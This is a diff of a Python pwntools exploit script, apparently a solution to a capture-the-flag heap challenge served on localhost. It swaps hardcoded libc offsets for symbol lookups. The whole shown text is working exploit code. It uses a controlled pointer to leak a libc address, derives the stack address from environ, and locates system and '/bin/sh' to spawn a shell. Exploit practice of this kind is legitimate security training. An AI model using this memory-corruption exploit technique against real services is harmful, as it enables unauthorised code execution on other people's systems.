@@ -35,17 +35,19 @@ def delete(num):
 	r.recvuntil("Introduce the menu to delete\n")
 	r.sendline(str(num))
 
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
+
 r = remote("localhost", 4444)
 create(1, 80)
 create(2, 80)
 ingredients(1, p64(0x602030))
 leak = u64(ver(1)[:8].ljust(8, '\0'))
 base_libc = leak - 0x3c48e0
-p_environ = base_libc + 0x3c6f38
+p_environ = base_libc + libc.symbols['environ']
 ingredients(1, p64(p_environ))
 p_stack = u64(ver(1)[:8].ljust(8, '\0')) - 0x134
-p_system = base_libc + 0x45390
-p_bin_sh = base_libc + 0x18cd17
+p_system = base_libc + libc.symbols['system']
+p_bin_sh = base_libc + next(libc.search("/bin/sh\0"))
 print "[+] ptr stack: %s" % hex(p_stack)
 print "[+] base libc: %s" % hex(base_libc)
 print "[+] system   : %s" % hex(p_system)
